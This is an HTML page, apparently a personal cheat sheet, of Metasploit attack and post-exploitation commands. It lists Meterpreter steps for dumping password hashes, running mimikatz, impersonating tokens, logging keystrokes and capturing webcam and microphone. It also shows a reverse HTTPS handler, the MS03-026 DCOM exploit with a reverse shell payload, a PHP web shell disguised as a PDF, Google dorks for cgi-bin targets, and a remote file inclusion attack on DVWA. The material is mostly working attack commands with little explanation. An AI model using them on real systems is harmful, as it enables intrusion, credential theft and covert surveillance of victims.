<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Msfpostexploitation - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "search dcom", url: "#_top", children: [
          ]},
          {title: "msfnginx", url: "#msfnginx", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <p>[+] Meterpreter Shell</p>
<p>meterpreter &gt; sysinfo</p>
<p>meterpreter &gt; getuid</p>
<p>meterpreter &gt; getsystem</p>
<p>meterpreter &gt; hashdump</p>
<p>meterpreter &gt; load/use mimikatz</p>
<p>kerberos          Attempt to retrieve kerberos creds
livessp           Attempt to retrieve livessp creds
mimikatz_command  Run a custom commannd
msv               Attempt to retrieve msv creds (hashes)
ssp               Attempt to retrieve ssp creds
tspkg             Attempt to retrieve tspkg creds
wdigest           Attempt to retrieve wdigest creds</p>
<p>meterpreter &gt; wdigest</p>
<p>meterpreter &gt; use incognito
meterpreter &gt; list_tokens -u
meterpreter &gt; impersonate_token SERV-2K3\Administrator
execute -f cmd.exe -i -t</p>
<p>Metasploit Exploit Multi Handler</p>
<p>multi/handler to accept an incoming reverse_https_meterpreter</p>
<div class="language-text highlight"><pre><span></span><code>    `payload
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_https
    set LHOST $ip
    set LPORT 443
    exploit
    [*] Started HTTPS reverse handler on https://$ip:443/`
</code></pre></div>
<p>Building Your Own MSF Module</p>
<div class="language-text highlight"><pre><span></span><code>    `mkdir -p ~/.msf4/modules/exploits/linux/misc
    cd ~/.msf4/modules/exploits/linux/misc
    cp
    /usr/share/metasploitframework/modules/exploits/linux/misc/gld\_postfix.rb
    ./crossfire.rb
    nano crossfire.rb`
</code></pre></div>
<p>Post Exploitation with Metasploit - (available options depend on OS and Meterpreter Cababilities)</p>
<div class="language-text highlight"><pre><span></span><code>    `download` Download a file or directory
    `upload` Upload a file or directory
    `portfwd` Forward a local port to a remote service
    `route` View and modify the routing table
    `keyscan_start` Start capturing keystrokes
    `keyscan_stop` Stop capturing keystrokes
    `screenshot` Grab a screenshot of the interactive desktop
    `record_mic` Record audio from the default microphone for X seconds
    `webcam_snap` Take a snapshot from the specified webcam
    `getsystem` Attempt to elevate your privilege to that of local system.
    `hashdump` Dumps the contents of the SAM database
</code></pre></div>
<h3 id="search-dcom">search dcom</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>msf &gt; search dcom
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>msf &gt; use exploit/windows/dcerpc/ms03_026_dcom
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>msf &gt; set RHOST 10.0.0.3
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>msf &gt; show payloads
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>msf &gt; set PAYLOAD generic/shell_reverse_tcp
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>msf &gt; set LHOST 10.0.0.6
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>msf &gt; exploit
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>sessions ‚Äìi 1
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>C: &gt;dir
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>wc lfi.pdf
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a> 4  4 42 lfi.pdf
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a> cat lfi.pdf
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>%PDF-1.4
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>&lt;?php
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>  system($_GET[&quot;cmd&quot;]);
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>?&gt;
</span></code></pre></div>
<h2 id="msfnginx">msfnginx</h2>
<p>sitemap.xml filetype:xml intext:"cgi-bin"
filetype:sh inurl:cgi-bin
filetype:sh
intext:cgi-bin
intitle:apache "cgi-bin"
inurl:cgi-bin
inurl:wspd_cgi.sh
inurl:wslb.sh
inurl:"server-status" intitle:apache "cgi-bin"
inurl:cgi-bin "GATEWAY_INTERFACE = CGI"
inurl:cgi-bin inurl:printenv intext:SERVER_ADDR</p>
<p><code>http://172.16.1.102/dvwa/vulnerabilities/fi/?page=http://172.16.1.100/test.php</code></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>exploit/linux/http/nginx_chunked_size
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>auxiliary/scanner/http/wordpress_ghost_scanner
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>sudo nano /etc/php5/cgi/php.ini
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>allow_url_fopen and allow_url_include are both set to On. Press Ctrl-X, Y, and Enter
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>sudo /etc/init.d/apache2 restart
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>nano /var/www/html/test.php
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>service apache2 restart
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>msf exploit(unix/webapp/php_include) &gt; set rhost 172.16.1.102
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>msf exploit(unix/webapp/php_include) &gt; set headers &quot;Cookie:security=low; PHPSESSID=4c0c7c70dfafab05e7d04c88c8966aee&quot;
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>headers =&gt; Cookie:security=low; PHPSESSID=4c0c7c70dfafab05e7d04c88c8966aee
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>msf exploit(unix/webapp/php_include) &gt; set path /dvwa/vulnerabilities/fi/
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>msf exploit(unix/webapp/php_include) &gt; set phpuri /?page=XXpathXX
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>msf exploit(unix/webapp/php_include) &gt; set payload php/bind_php
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>msf exploit(unix/webapp/php_include) &gt; run
</span></code></pre></div>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/msfpostexploitation.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ‚ö†Ô∏è The quieter you become, the more you are able to hear ü•∑</p>
</footer>

</body>
</html>